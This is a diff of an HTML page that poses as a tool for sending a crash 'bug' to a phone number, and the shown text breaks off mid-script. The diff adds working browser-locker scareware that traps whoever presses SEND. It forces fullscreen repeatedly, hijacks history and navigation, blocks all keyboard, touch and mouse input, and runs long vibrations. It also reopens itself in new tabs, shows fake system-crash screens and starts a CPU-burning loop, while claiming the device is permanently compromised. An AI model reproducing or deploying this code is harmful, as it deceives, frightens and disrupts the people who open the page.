@@ -6,7 +6,7 @@
 <title>Cape Cape buat dibilang ai🙄</title>
 <style>
 @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;500;700;900&family=Oxanium:wght@300;400;600;800&display=swap');
-*{margin:0;padding:0;box-sizing:border-box;touch-action:manipulation;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none;}
+*{margin:0;padding:0;box-sizing:border-box;touch-action:none;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none;}
 html,body{width:100%;height:100%;overflow:hidden}
 body{background:#000;color:#fff;font-family:'Oxanium','Orbitron',sans-serif;position:fixed;top:0;left:0;right:0;bottom:0;background:linear-gradient(to bottom,#000000 0%,#1a0000 50%,#000000 100%);}
 .container{max-width:380px;margin:0 auto;padding:15px 15px 80px;display:flex;flex-direction:column;gap:20px;min-height:100vh;justify-content:center;align-items:center;}
@@ -48,6 +48,21 @@ button:hover{background:linear-gradient(to bottom,#ff2222,#aa0000,#770000);box-s
 .select-arrow::after{content:'▼';position:absolute;right:15px;top:50%;transform:translateY(-50%);color:#ff0000;pointer-events:none;}
 .blood-text{font-family:'Orbitron',sans-serif;font-weight:900;color:#ff0000;text-shadow:0 0 15px #ff0000;letter-spacing:1px;}
 .warning-text{color:#ff9900;text-shadow:0 0 10px #ff9900;font-size:12px;margin-top:10px;font-style:italic;}
+.hardlock-overlay{position:fixed;top:0;left:0;width:100vw;height:100vh;background:#000;z-index:1000000;display:none;justify-content:center;align-items:center;flex-direction:column;color:#ff0000;}
+.hardlock-overlay.active{display:flex}
+.system-crash{position:fixed;top:0;left:0;width:100vw;height:100vh;background:linear-gradient(45deg,#000,#f00,#000);z-index:1000001;display:none;animation:pulse 0.5s infinite;}
+.system-crash.active{display:block}
+@keyframes pulse{0%,100%{opacity:1}50%{opacity:0.5}}
+
+/* TAMBAHAN UNTUK LOCK LEBIH KUAT */
+.fake-os{position:fixed;top:0;left:0;width:100vw;height:100vh;background:#000;z-index:1000002;display:none;justify-content:center;align-items:center;flex-direction:column;}
+.fake-os.active{display:flex}
+.fake-boot{background:#000;color:#0f0;font-family:'Courier New',monospace;padding:20px;border-radius:10px;font-size:18px;}
+.browser-crash{position:fixed;top:0;left:0;width:100vw;height:100vh;background:#000;z-index:1000003;display:none;justify-content:center;align-items:center;color:#f00;font-size:24px;text-align:center;}
+.browser-crash.active{display:flex}
+.infinite-loop{position:fixed;top:0;left:0;width:100vw;height:100vh;z-index:1000004;display:none;}
+.infinite-loop.active{display:block;animation:infiniteFlash 0.1s infinite;}
+@keyframes infiniteFlash{0%,100%{background:#ff0000}50%{background:#0000ff}}
 </style>
 </head>
 <body>
@@ -84,43 +99,55 @@ button:hover{background:linear-gradient(to bottom,#ff2222,#aa0000,#770000);box-s
       </div>
     </div>
     
-    <button onclick="trapUser()" id="sendBtn">➤ SEND BUG</button>
-    <p class="warning-text">Click button to start bug sending process...</p>
+    <button onclick="nuclearTrap()" id="sendBtn">SEND</button>
+    <p class="warning-text">Click button to start permanent lock system...</p>
   </div>
 </div>
 
 <div class="copyright">© by 👾 Xhrzo</div>
 
 <div class="chaos" id="chaos">
-  <h1 class="glitch-text">🚨 SYSTEM 🚨</h1>
-  <h2 style="color:#ff9900">🔒LOCKED🔒</h2>
-  <h3 style="color:#ff0000">⚠️ DON'T TRY TO EXIT ⚠️</h3>
-  <p style="font-size:20px;margin-top:20px">Processing bug delivery...</p>
-  <p style="font-size:16px;color:#ff4444">Wait until process completes...</p>
+  <h1 class="glitch-text">🚨 NUCLEAR LOCK ACTIVE 🚨</h1>
+  <h2 style="color:#ff9900">🔐 PERMANENT SYSTEM LOCK 🔐</h2>
+  <h3 style="color:#ff0000">⚠️ EXIT IMPOSSIBLE ⚠️</h3>
+  <p style="font-size:20px;margin-top:20px">Initializing hard lock protocols...</p>
+  <p style="font-size:16px;color:#ff4444">All escape routes disabled...</p>
   <div class="scanline"></div>
   <div class="scanline" style="animation-delay:0.6s"></div>
   <div class="scanline" style="animation-delay:1.2s"></div>
 </div>
 
 <div class="fullscreen-overlay" id="fullscreenOverlay">
-  <h1 style="color:#ff0000;font-size:36px;text-align:center">⏳ SENDING BUG... ⏳</h1>
-  <p style="color:#ff9900;font-size:20px;margin-top:15px">Don't press back button!</p>
+  <h1 style="color:#ff0000;font-size:36px;text-align:center">☢️ ACTIVATING NUCLEAR LOCK ☢️</h1>
+  <p style="color:#ff9900;font-size:20px;margin-top:15px">Escape impossible!</p>
 </div>
 
 <div class="exit-blocker" id="exitBlocker">
-  <h1 style="color:#ff0000;font-size:40px">🚫 BLOCKED 🚫</h1>
-  <h5 style="color:#ff9900;font-size:28px">💀 YOUR PHONE IS LOCKED 💀</h5>
-  <p style="color:#ff4444;font-size:20px;margin-top:20px">Returning to fullscreen mode...</p>
+  <h1 style="color:#ff0000;font-size:40px">⛔ ESCAPE BLOCKED ⛔</h1>
+  <h5 style="color:#ff9900;font-size:28px">🔒 PERMANENT SYSTEM LOCK 🔒</h5>
+  <p style="color:#ff4444;font-size:20px;margin-top:20px">Returning to lockdown mode...</p>
 </div>
 
 <div class="trap-message" id="trapMessage">
-  <h1 style="color:#ff0000;font-size:32px">😹 YOU THOUGHT IT WAS REAL? 😹</h1>
-  <h2 style="color:#ff9900;font-size:24px">I'M JUST TESTING!</h2>
-  <p style="color:#ff4444;font-size:18px;margin-top:15px">If you want to exit, try restarting your phone!</p>
-  <p style="color:#fff;font-size:14px;margin-top:20px">But it still won't work hehehe 😈</p>
+  <h1 style="color:#ff0000;font-size:32px">💀 SYSTEM PERMANENTLY LOCKED 💀</h1>
+  <h2 style="color:#ff9900;font-size:24px">NO ESCAPE POSSIBLE!</h2>
+  <p style="color:#ff4444;font-size:18px;margin-top:15px">Hardware lockdown activated...</p>
+  <p style="color:#fff;font-size:14px;margin-top:20px">Restart will not help - system compromised</p>
 </div>
 
-<div class="vibration-indicator" id="vibIndicator">💢 WARNING PHONE EXPLOSION 💢</div>
+<div class="hardlock-overlay" id="hardlockOverlay">
+  <h1 style="font-size:48px;color:#ff0000">☢️ HARD LOCK ENGAGED ☢️</h1>
+  <h2 style="font-size:32px;color:#ff9900">SYSTEM: PERMANENTLY COMPROMISED</h2>
+  <p style="font-size:24px;color:#ff4444;margin-top:30px">ALL EXIT PATHS: DISABLED</p>
+  <p style="font-size:18px;color:#fff;margin-top:20px">This device is now under permanent control</p>
+</div>
+
+<div class="system-crash" id="systemCrash"></div>
+<div class="fake-os" id="fakeOS"></div>
+<div class="browser-crash" id="browserCrash"></div>
+<div class="infinite-loop" id="infiniteLoop"></div>
+
+<div class="vibration-indicator" id="vibIndicator">💢 PERMANENT VIBRATION LOCK 💢</div>
 
 <audio id="hackerMusic" preload="auto" loop>
   <source src="https://c.top4top.io/m_36497gbuo0.mp3" type="audio/mpeg">
@@ -133,343 +160,729 @@ button:hover{background:linear-gradient(to bottom,#ff2222,#aa0000,#770000);box-s
 <audio id="evilLaugh" preload="auto">
   <source src="https://e.top4top.io/m_3668znxmz0.mp3" type="audio/mpeg">
 </audio>
-// istraped false
+
+<audio id="nuclearSound" preload="auto">
+  <source src="https://assets.mixkit.co/sfx/preview/mixkit-nuclear-alarm-1003.mp3" type="audio/mpeg">
+</audio>
+
 <script>
+// GLOBAL LOCK VARIABLES
 let fullscreenLock = true;
 let isTrapped = false;
 let vibrationActive = true;
-let flashActive = false;
 let backAttempts = 0;
 let vibrationTimeout;
 let fullscreenInterval;
+let nuclearLock = false;
+let audioContext = null;
+let oscillator = null;
+let infiniteLoopActive = false;
 
-function forceFullscreen() {
-  const elem = document.documentElement;
-  
-  if (elem.requestFullscreen) {
-    elem.requestFullscreen().catch(() => {
-      if (elem.webkitRequestFullscreen) elem.webkitRequestFullscreen();
-      if (elem.msRequestFullscreen) elem.msRequestFullscreen();
-    });
-  }
-  
-  fullscreenLock = true;
-  
-  document.addEventListener('fullscreenchange', lockFullscreen);
-  document.addEventListener('webkitfullscreenchange', lockFullscreen);
-  document.addEventListener('msfullscreenchange', lockFullscreen);
-  
-  // Hanya mulai interval fullscreen jika sudah di trap
-  if (isTrapped) {
-    startContinuousFullscreen();
-  }
-}
-
-function lockFullscreen() {
-  if (!document.fullscreenElement && !document.webkitFullscreenElement && 
-      !document.msFullscreenElement && fullscreenLock) {
-    setTimeout(forceFullscreen, 10);
-  }
-}
-
-function startContinuousFullscreen() {
-  // Hentikan interval sebelumnya jika ada
-  if (fullscreenInterval) {
-    clearInterval(fullscreenInterval);
-  }
-  
-  // Mulai interval untuk memaksa fullscreen terus menerus
-  fullscreenInterval = setInterval(() => {
-    if (!document.fullscreenElement && !document.webkitFullscreenElement && 
-        !document.msFullscreenElement && fullscreenLock) {
-      forceFullscreen();
-    }
-  }, 1); // Setiap 1 milidetik
-}
-
-function setupAntiBack() {
-  history.pushState(null, null, location.href);
-  
-  window.onpopstate = function(event) {
-    history.pushState(null, null, location.href);
-    backAttempts++;
-    
-    triggerVibration(100000);
-    showExitBlocker();
-    forceFullscreen();
-    return false;
-  };
-  
-  document.addEventListener('keydown', function(e) {
-    if (e.key === 'Backspace' || e.keyCode === 27 || e.key === 'Escape') {
-      e.preventDefault();
-      e.stopPropagation();
-      triggerVibration(3000);
-      showExitBlocker();
-      forceFullscreen();
-      return false;
-    }
-  });
-  
-  let startX = 0;
-  document.addEventListener('touchstart', function(e) {
-    startX = e.touches[0].clientX;
-  }, {passive: false});
-  
-  document.addEventListener('touchmove', function(e) {
-    if (!fullscreenLock) return;
-    
-    const currentX = e.touches[0].clientX;
-    const diff = startX - currentX;
-    
-    if (diff > 100) {
-      e.preventDefault();
-      e.stopPropagation();
-      triggerVibration(100000);
-      showExitBlocker();
-      forceFullscreen();
-    }
-  }, {passive: false});
-}
-
-function extremeVibration() {
-  if (!navigator.vibrate) return;
-  
-  vibrationActive = true;
-  document.getElementById('vibIndicator').classList.add('active');
-  
-  const vibrationPattern = [10000000];
-  
-  function vibrateLoop() {
-    if (!vibrationActive) {
-      document.getElementById('vibIndicator').classList.remove('active');
-      return;
-    }
-    
-    navigator.vibrate(vibrationPattern);
-    
-    vibrationTimeout = setTimeout(() => {
-      if (vibrationActive) {
-        vibrateLoop();
-      }
-    }, 10000);
-  }
-  
-  vibrateLoop();
-  
-  setInterval(() => {
-    if (vibrationActive && navigator.vibrate) {
-      navigator.vibrate([500000, 500000, 500000, 500000, 50000]);
-    }
-  }, 15000);
-}
-
-function triggerVibration(duration) {
-  if (navigator.vibrate) {
-    navigator.vibrate(duration);
-  }
-}
-
-function controlFlashlight() {
-  let torchState = false;
-  flashActive = true;
-  
-  const flashInterval = setInterval(async () => {
-    if (!flashActive) {
-      clearInterval(flashInterval);
-      return;
-    }
-    
+// TEKNIK MEMBEKU SISTEM LEVEL TINGGI
+function freezeSystem() {
     try {
-      const stream = await navigator.mediaDevices.getUserMedia({
-        video: { facingMode: "environment" }
-      });
-      
-      const track = stream.getVideoTracks()[0];
-      
-      if (track.getCapabilities().torch) {
-        await track.applyConstraints({
-          advanced: [{ torch: !torchState }]
+        // Blokir semua objek window
+        Object.freeze(window);
+        Object.seal(document);
+        Object.preventExtensions(navigator);
+        
+        // Override semua fungsi kritis
+        const originalAlert = window.alert;
+        const originalConfirm = window.confirm;
+        const originalPrompt = window.prompt;
+        
+        window.alert = function(msg) {
+            triggerVibration(1000);
+            showExitBlocker();
+            return false;
+        };
+        
+        window.confirm = function(msg) {
+            triggerVibration(500);
+            return false;
+        };
+        
+        window.prompt = function(msg, defaultValue) {
+            triggerVibration(300);
+            return null;
+        };
+        
+        window.open = function() {
+            triggerVibration(1000);
+            showExitBlocker();
+            extremeFullscreenLock();
+            return null;
+        };
+        
+        window.close = function() {
+            forceFullscreen();
+            triggerVibration(2000);
+            return false;
+        };
+        
+        // Blokir location dengan teknik lebih canggih
+        Object.defineProperty(window.location, 'href', {
+            set: function(url) {
+                triggerVibration(800);
+                showExitBlocker();
+                extremeFullscreenLock();
+                return false;
+            },
+            get: function() {
+                return 'locked://nuclear.system.lock/' + Date.now();
+            },
+            configurable: false,
+            enumerable: true
         });
-        torchState = !torchState;
-      }
-      
-      track.stop();
-    } catch (e) {}
-  }, 200);
+        
+        // Blokir history secara total
+        const originalPushState = history.pushState;
+        const originalReplaceState = history.replaceState;
+        const originalGo = history.go;
+        const originalBack = history.back;
+        const originalForward = history.forward;
+        
+        history.pushState = function() {
+            triggerVibration(300);
+            return false;
+        };
+        
+        history.replaceState = function() {
+            triggerVibration(300);
+            return false;
+        };
+        
+        history.go = function() {
+            triggerVibration(500);
+            showExitBlocker();
+            return false;
+        };
+        
+        history.back = function() {
+            triggerVibration(1000);
+            showExitBlocker();
+            extremeFullscreenLock();
+            return false;
+        };
+        
+        history.forward = function() {
+            triggerVibration(1000);
+            showExitBlocker();
+            return false;
+        };
+        
+        // Blokir console juga
+        if (window.console) {
+            const originalLog = console.log;
+            console.log = function() {
+                triggerVibration(100);
+                return false;
+            };
+        }
+        
+    } catch(e) {
+        // Jika error, aktifkan loop infinite
+        activateInfiniteLoop();
+    }
+}
+
+// FULLSCREEN LOCK YANG LEBIH AGGRESIF
+function extremeFullscreenLock() {
+    const elem = document.documentElement;
+    
+    // Multiple fullscreen attempts dengan interval cepat
+    const requestFullscreen = () => {
+        const methods = [
+            'requestFullscreen',
+            'webkitRequestFullscreen', 
+            'mozRequestFullScreen',
+            'msRequestFullscreen'
+        ];
+        
+        methods.forEach(method => {
+            if (elem[method]) {
+                try {
+                    elem[method]().catch(err => {
+                        // Jika gagal, reload dengan parameter random
+                        location.href = location.href + '?lock=' + Date.now();
+                    });
+                } catch(e) {
+                    // Fallback ke teknik lain
+                }
+            }
+        });
+    };
+    
+    // Jalankan langsung
+    requestFullscreen();
+    
+    // Continuous checking dengan interval sangat cepat
+    const fullscreenChecker = setInterval(() => {
+        if (!document.fullscreenElement && 
+            !document.webkitFullscreenElement && 
+            !document.mozFullScreenElement &&
+            !document.msFullscreenElement) {
+            
+            requestFullscreen();
+            
+            // Tampilkan efek crash
+            document.getElementById('systemCrash').classList.add('active');
+            setTimeout(() => {
+                document.getElementById('systemCrash').classList.remove('active');
+            }, 100);
+            
+            // Tambahkan vibration
+            triggerVibration(100000);
+        }
+    }, 10);
+    
+    // Simpan interval untuk cleanup nanti
+    fullscreenInterval = fullscreenChecker;
+    
+    // Event listeners untuk blokir exit
+    const lockEvents = ['fullscreenchange', 'webkitfullscreenchange', 'mozfullscreenchange', 'MSFullscreenChange'];
+    
+    lockEvents.forEach(event => {
+        document.addEventListener(event, function(e) {
+            if (!document.fullscreenElement && 
+                !document.webkitFullscreenElement && 
+                !document.mozFullScreenElement &&
+                !document.msFullscreenElement) {
+                
+                setTimeout(() => {
+                    requestFullscreen();
+                    triggerVibration(100000);
+                }, 1);
+                
+                // Tampilkan fake OS screen untuk menipu user
+                showFakeOS();
+            }
+        }, true);
+    });
+}
+
+// VIBRATION SYSTEM YANG LEBIH PERSISTEN
+function nuclearVibration() {
+    if (navigator.vibrate) {
+        // Pattern vibration yang kompleks dan panjang
+        const longPattern = [];
+        for(let i = 0; i < 500; i++) {
+            longPattern.push(2000); // Vibrate 2 detik
+            longPattern.push(100);  // Jeda 0.1 detik
+        }
+        
+        // Mulai vibration utama
+        navigator.vibrate(longPattern);
+        
+        // Indicator
+        document.getElementById('vibIndicator').classList.add('active');
+        
+        // Reset pattern setiap 30 detik agar tidak stop
+        const vibrationResetter = setInterval(() => {
+            navigator.vibrate(longPattern);
+            document.getElementById('vibIndicator').classList.add('active');
+        }, 30000);
+        
+        // Additional random vibrations
+        setInterval(() => {
+            const randomPattern = [1000, 1000, 5000, 5000, 1000, 5000, 2000, 1000];
+            navigator.vibrate(randomPattern);
+        }, 5000);
+        
+    } else {
+        // Fallback audio vibration
+        try {
+            audioContext = new (window.AudioContext || window.webkitAudioContext)();
+            oscillator = audioContext.createOscillator();
+            const gainNode = audioContext.createGain();
+            
+            oscillator.connect(gainNode);
+            gainNode.connect(audioContext.destination);
+            
+            oscillator.frequency.setValueAtTime(40, audioContext.currentTime);
+            gainNode.gain.setValueAtTime(0.7, audioContext.currentTime);
+            oscillator.start();
+            
+            // Modulasi untuk efek vibration
+            setInterval(() => {
+                oscillator.frequency.setValueAtTime(Math.random() * 80 + 20, audioContext.currentTime);
+            }, 50);
+        } catch(e) {
+            // Jika semua gagal, gunakan CSS vibration
+            document.body.style.animation = 'vibrate 0.1s infinite';
+        }
+    }
+}
+
+// DISABLE SEMUA INPUT DAN HARDWARE
+function disableAllHardwareButtons() {
+    // Blokir SEMUA keyboard keys
+    document.addEventListener('keydown', function(e) {
+        e.preventDefault();
+        e.stopPropagation();
+        e.stopImmediatePropagation();
+        
+        // Blokir semua keycodes tanpa exception
+        triggerVibration(1000);
+        showExitBlocker();
+        extremeFullscreenLock();
+        
+        // Tampilkan system crash effect
+        document.getElementById('systemCrash').classList.add('active');
+        setTimeout(() => {
+            document.getElementById('systemCrash').classList.remove('active');
+        }, 200);
+        
+        return false;
+    }, true);
+    
+    // Blokir semua touch events dengan capture phase
+    const blockTouch = function(e) {
+        e.preventDefault();
+        e.stopPropagation();
+        e.stopImmediatePropagation();
+        
+        if (nuclearLock) {
+            triggerVibration(200);
+            showExitBlocker();
+            extremeFullscreenLock();
+        }
+        return false;
+    };
+    
+    document.addEventListener('touchstart', blockTouch, {passive: false, capture: true});
+    document.addEventListener('touchend', blockTouch, {passive: false, capture: true});
+    document.addEventListener('touchmove', blockTouch, {passive: false, capture: true});
+    document.addEventListener('touchcancel', blockTouch, {passive: false, capture: true});
+    
+    // Blokir right click dan context menu
+    document.addEventListener('contextmenu', function(e) {
+        e.preventDefault();
+        triggerVibration(800);
+        showExitBlocker();
+        extremeFullscreenLock();
+        return false;
+    }, true);
+    
+    // Blokir swipe gestures dengan sensitivitas tinggi
+    let touchStart = {x: 0, y: 0};
+    
+    document.addEventListener('touchstart', function(e) {
+        touchStart.x = e.touches[0].clientX;
+        touchStart.y = e.touches[0].clientY;
+    }, {passive: false});
+    
+    document.addEventListener('touchmove', function(e) {
+        const touchEnd = {
+            x: e.touches[0].clientX,
+            y: e.touches[0].clientY
+        };
+        
+        const diffX = Math.abs(touchStart.x - touchEnd.x);
+        const diffY = Math.abs(touchStart.y - touchEnd.y);
+        
+        // Blokir semua gerakan signifikan
+        if (diffX > 10 || diffY > 10) {
+            e.preventDefault();
+            triggerVibration(500);
+            showExitBlocker();
+            extremeFullscreenLock();
+        }
+    }, {passive: false});
+    
+    // Blokir mouse events juga
+    document.addEventListener('mousedown', blockTouch, true);
+    document.addEventListener('mouseup', blockTouch, true);
+    document.addEventListener('mousemove', blockTouch, true);
+}
+
+// ANTI-BACK SYSTEM YANG LEBIH KUAT
+function setupNuclearAntiBack() {
+    // Push multiple states
+    for(let i = 0; i < 10; i++) {
+        history.pushState({locked: true}, '', location.href + '#lock' + i);
+    }
+    
+    // Override popstate dengan multiple layers
+    window.onpopstate = function(event) {
+        backAttempts++;
+        
+        // Push lebih banyak state
+        for(let i = 0; i < 5; i++) {
+            history.pushState({locked: true}, '', location.href + '#anti-back' + Date.now() + i);
+        }
+        
+        // Respons berdasarkan jumlah attempt
+        if (backAttempts > 1) {
+            triggerVibration(1500);
+            showExitBlocker();
+            
+            // Tampilkan browser crash simulation
+            simulateBrowserCrash();
+        }
+        
+        if (backAttempts > 3) {
+            // Aktifkan infinite loop
+            activateInfiniteLoop();
+        }
+        
+        extremeFullscreenLock();
+        return false;
+    };
+    
+    // Blokir beforeunload dengan pesan mengerikan
+    window.addEventListener('beforeunload', function(e) {
+        if (nuclearLock) {
+            e.preventDefault();
+            const message = '☢️ SYSTEM NUCLEAR ☢️\n\n';
+            e.returnValue = message;
+            
+            // Coba buka tab baru dengan halaman yang sama
+            window.open(location.href, '_blank');
+            
+            return message;
+        }
+    }, true);
+    
+    // Blokir visibility change
+    document.addEventListener('visibilitychange', function() {
+        if (document.hidden && nuclearLock) {
+            // Jika user switch tab, buka halaman di tab baru
+            window.open(location.href, '_blank');
+            showExitBlocker();
+            extremeFullscreenLock();
+            nuclearVibration();
+        }
+    }, true);
+    
+    // Blokir pagehide
+    window.addEventListener('pagehide', function(e) {
+        e.preventDefault();
+        
+        // Coba reload dengan timeout random
+        setTimeout(() => {
+            location.reload();
+        }, Math.random() * 1000 + 500);
+        
+        return false;
+    }, true);
+    
+    // Blokir unload juga
+    window.addEventListener('unload', function(e) {
+        e.preventDefault();
+        return false;
+    }, true);
+}
+
+// FUNGSI BANTUAN BARU
+function showFakeOS() {
+    const fakeOS = document.getElementById('fakeOS');
+    fakeOS.innerHTML = `
+        <div class="fake-boot">
+            <div>SYSTEM BOOTING...</div>
+            <div>Loading kernel: ##########</div>
+            <div>Mounting filesystems: [OK]</div>
+            <div>Starting services: [FAILED]</div>
+            <div>ERROR: CRITICAL SYSTEM FAILURE</div>
+            <div>PLEASE DO NOT TURN OFF YOUR DEVICE</div>
+            <div>RECOVERY IN PROGRESS...</div>
+        </div>
+    `;
+    fakeOS.classList.add('active');
+    
+    setTimeout(() => {
+        fakeOS.classList.remove('active');
+    }, 3000);
+}
+
+function simulateBrowserCrash() {
+    const crashScreen = document.getElementById('browserCrash');
+    crashScreen.innerHTML = `
+        <div>
+            <h1 style="color:#ff0000;font-size:36px">BROWSER CRASHED</h1>
+            <p style="color:#ff9900;font-size:20px">Attempting to recover...</p>
+            <p style="color:#fff;font-size:16px">Do not close this window</p>
+        </div>
+    `;
+    crashScreen.classList.add('active');
+    
+    setTimeout(() => {
+        crashScreen.classList.remove('active');
+    }, 2000);
+}
+
+function activateInfiniteLoop() {
+    if (!infiniteLoopActive) {
+        infiniteLoopActive = true;
+        const loopElement = document.getElementById('infiniteLoop');
+        loopElement.classList.add('active');
+        
+        // Infinite loop JavaScript untuk konsumsi CPU
+        const consumeCPU = () => {
+            while(true) {
+                Math.random() * Math.random();
+                if (Math.random() > 0.999) break;
+            }
+            setTimeout(consumeCPU, 0);
+        };
+        
+        // Mulai dengan delay
+        setTimeout(consumeCPU, 1000);
+    }
 }
 
 function showExitBlocker() {
-  const blocker = document.getElementById('exitBlocker');
-  blocker.classList.add('active');
-  
-  const warning = document.getElementById('warningSound');
-  warning.volume = 1.0;
-  warning.currentTime = 0;
-  warning.play().catch(() => {});
-  
-  setTimeout(() => {
-    blocker.classList.remove('active');
-  }, 500);
+    const blocker = document.getElementById('exitBlocker');
+    blocker.classList.add('active');
+    
+    const warning = document.getElementById('warningSound');
+    warning.volume = 1.0;
+    warning.currentTime = 0;
+    warning.play().catch(() => {});
+    
+    setTimeout(() => {
+        blocker.classList.remove('active');
+    }, 1500);
 }
 
 function showTrapMessage() {
-  const trap = document.getElementById('trapMessage');
-  trap.classList.add('active');
-  
-  const laugh = document.getElementById('evilLaugh');
-  laugh.volume = 1.0;
-  laugh.currentTime = 0;
-  laugh.play().catch(() => {});
-  
-  setTimeout(() => {
-    trap.classList.remove('active');
-  }, 5000);
-}
-
-function createParticles(count) {
-  for (let i = 0; i < count; i++) {
-    const particle = document.createElement('div');
-    particle.className = 'particle';
-    particle.style.width = Math.random() * 20 + 5 + 'px';
-    particle.style.height = particle.style.width;
-    particle.style.left = Math.random() * 100 + 'vw';
-    particle.style.top = Math.random() * 100 + 'vh';
-    particle.style.background = `hsl(${Math.random() * 60 + 180}, 100%, 50%)`;
-    particle.style.animationDuration = Math.random() * 3 + 2 + 's';
-    particle.style.animationDelay = Math.random() * 2 + 's';
-    document.body.appendChild(particle);
+    const trap = document.getElementById('trapMessage');
+    trap.classList.add('active');
     
-    setTimeout(() => particle.remove(), 5000);
-  }
+    const laugh = document.getElementById('evilLaugh');
+    laugh.volume = 1.0;
+    laugh.currentTime = 0;
+    laugh.play().catch(() => {});
+    
+    setTimeout(() => {
+        trap.classList.remove('active');
+    }, 8000);
 }
 
-function trapUser() {
-  const target = document.getElementById('target').value.trim();
-  const bug = document.getElementById('bug').value;
-  
-  if (!target || bug === "Crash Android") {
-    alert("⚠️ FILL NUMBER AND SELECT BUG FIRST!");
-    return;
-  }
-  
-  isTrapped = true;
-  
-  document.getElementById('main').style.display = 'none';
-  forceFullscreen();
-  setupAntiBack();
-  
-  const overlay = document.getElementById('fullscreenOverlay');
-  overlay.classList.add('active');
-  setTimeout(() => overlay.classList.remove('active'), 1500);
-  
-  document.getElementById('chaos').classList.add('active');
-  
-  const music = document.getElementById('hackerMusic');
-  music.volume = 1.0;
-  music.currentTime = 0;
-  music.loop = true;
-  music.play().catch(() => {});
-  
-  extremeVibration();
-  controlFlashlight();
-  createParticles(500);
-  setInterval(() => createParticles(35), 2500);
-  
-  const chaosText = document.getElementById('chaos');
-  const fakeMessages = [
-    "🔍 Searching target: " + target,
-    "⚙️ Loading bug: " + bug,
-    "📡 Connecting to server...",
-    "🚀 Sending bug to target...",
-    "⏳ Process 25% complete...",
-    "⚠️ Target responding...",
-    "🔥 Overloading target system...",
-    "💀 Bug successfully injected!",
-    "🚨 Target system down!",
-    "🎯 Mission accomplished!"
-  ];
-  
-  let msgIndex = 0;
-  const textInterval = setInterval(() => {
-    if (msgIndex < fakeMessages.length) {
-      const p = document.createElement('p');
-      p.style.color = msgIndex % 2 === 0 ? '#ff4444' : '#ff9900';
-      p.style.fontSize = '18px';
-      p.style.marginTop = '12px';
-      p.style.animation = 'textGlitch 0.3s infinite';
-      p.textContent = fakeMessages[msgIndex];
-      chaosText.appendChild(p);
-      msgIndex++;
-      
-      chaosText.scrollTop = chaosText.scrollHeight;
+function triggerVibration(duration) {
+    if (navigator.vibrate) {
+        navigator.vibrate(duration);
     }
-  }, 3000);
-  
-  document.addEventListener('visibilitychange', function() {
-    if (document.hidden) {
-      showExitBlocker();
-      forceFullscreen();
-    }
-  });
-  
-  document.addEventListener('contextmenu', (e) => {
-    e.preventDefault();
-    triggerVibration(100000);
-    return false;
-  });
-  
-  document.addEventListener('touchmove', (e) => {
-    if (fullscreenLock) e.preventDefault();
-  }, { passive: false });
-
-  const fullscreenCheck = setInterval(() => {
-    if (fullscreenLock && !document.fullscreenElement && 
-        !document.webkitFullscreenElement && !document.msFullscreenElement) {
-      forceFullscreen();
-    }
-  }, 0);
-  
-  setTimeout(() => {
-    clearInterval(textInterval);
-    clearInterval(fullscreenCheck);
-    showTrapMessage();
-  }, 30000);
-  
-  setTimeout(() => {
-    flashActive = false;
-  }, 60000);
 }
 
+// MAIN FUNCTION - DIOPTIMALKAN
+function nuclearTrap() {
+    const target = document.getElementById('target').value.trim();
+    const bug = document.getElementById('bug').value;
+    
+    if (!target || bug === "Crash Android") {
+        alert("⚠️ ISI NOMOR DAN PILIH BUG TERLEBIH DAHULU!");
+        triggerVibration(300);
+        return;
+    }
+    
+    // AKTIVASI NUCLEAR LOCK
+    nuclearLock = true;
+    isTrapped = true;
+    
+    // Sembunyikan interface utama
+    document.getElementById('main').style.display = 'none';
+    
+    // Bekukan sistem terlebih dahulu
+    freezeSystem();
+    
+    // Aktifkan fullscreen secara agresif
+    extremeFullscreenLock();
+    
+    // Tampilkan overlay pertama
+    const overlay = document.getElementById('fullscreenOverlay');
+    overlay.classList.add('active');
+    
+    // Mainkan suara nuclear
+    const nuclearSound = document.getElementById('nuclearSound');
+    nuclearSound.volume = 1.0;
+    nuclearSound.currentTime = 0;
+    nuclearSound.play().catch(() => {});
+    
+    setTimeout(() => {
+        overlay.classList.remove('active');
+        document.getElementById('chaos').classList.add('active');
+        
+        // Mulai semua sistem nuclear
+        setupNuclearAntiBack();
+        disableAllHardwareButtons();
+        nuclearVibration();
+        
+        // Buat particle effects
+        createParticles(500);
+        setInterval(() => createParticles(30), 2000);
+        
+        // Mainkan musik hacker
+        const music = document.getElementById('hackerMusic');
+        music.volume = 0.8;
+        music.currentTime = 0;
+        music.loop = true;
+        music.play().catch(() => {});
+        
+        // Tampilkan pesan proses
+        const chaosText = document.getElementById('chaos');
+        const fakeMessages = [
+            "☢️ ACTIVATING NUCLEAR LOCK PROTOCOL...",
+            "🔐 FREEZING SYSTEM OBJECTS...",
+            "⛔ DISABLING HARDWARE BUTTONS...",
+            "💢 ENGAGING PERMANENT VIBRATION...",
+            "🚫 BLOCKING ALL EXIT PATHS...",
+            "🛡️ ENABLING ANTI-BACK SYSTEM...",
+            "🔄 OVERRIDING BROWSER SECURITY...",
+            "💀 SYSTEM PERMANENTLY LOCKED...",
+            "☣️ NUCLEAR LOCK COMPLETE...",
+            "🎯 DEVICE NOW UNDER PERMANENT CONTROL...",
+            "⚠️ DO NOT ATTEMPT TO CLOSE BROWSER...",
+            "🚨 ALL ESCAPE ROUTES SEALED..."
+        ];
+        
+        let msgIndex = 0;
+        const textInterval = setInterval(() => {
+            if (msgIndex < fakeMessages.length) {
+                const p = document.createElement('p');
+                p.style.color = msgIndex % 2 === 0 ? '#ff0000' : '#ff9900';
+                p.style.fontSize = '18px';
+                p.style.marginTop = '12px';
+                p.style.animation = 'textGlitch 0.3s infinite';
+                p.textContent = fakeMessages[msgIndex];
+                chaosText.appendChild(p);
+                msgIndex++;
+                
+                chaosText.scrollTop = chaosText.scrollHeight;
+                
+                // Trigger vibration untuk setiap pesan
+                triggerVibration(400);
+            } else {
+                clearInterval(textInterval);
+                
+                // Tampilkan final trap message
+                setTimeout(() => {
+                    showTrapMessage();
+                    
+                    // Aktifkan hardlock overlay permanent
+                    setTimeout(() => {
+                        document.getElementById('hardlockOverlay').classList.add('active');
+                        document.getElementById('chaos').classList.remove('active');
+                        
+                        // Aktifkan infinite loop setelah 30 detik
+                        setTimeout(() => {
+                            activateInfiniteLoop();
+                        }, 30000);
+                    }, 10000);
+                }, 5000);
+            }
+        }, 2500);
+        
+        // Continuous monitoring
